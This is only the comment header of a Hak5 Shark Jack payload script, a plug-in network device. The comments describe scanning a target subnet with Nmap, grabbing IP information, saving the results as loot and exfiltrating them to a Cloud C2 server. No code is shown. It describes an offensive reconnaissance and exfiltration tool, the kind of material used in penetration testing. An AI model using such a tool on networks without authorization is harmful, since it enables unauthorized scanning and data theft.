# Title: Nmap & IP Info Payload for Shark Jack w/ C2
# Author: Hak5 (modifications from UNIT98)
# Version: 1.1
#
# All credit goes to Hak5 Team :) 
# We stand on the shoulders of giants
#
# Edited to include hak5darren's IP info grabber for extra network information
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder. Exfiltrates all scans to C2 if provisioned.
#
# LED SETUP ... Obtaining IP address from DHCP
# LED ATTACK ... Scanning
# LED FINISH ... Scan Complete
# LED SPECIAL â€¦ Cloud C2 Exfiltration
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery with "-v" for more verbose
#
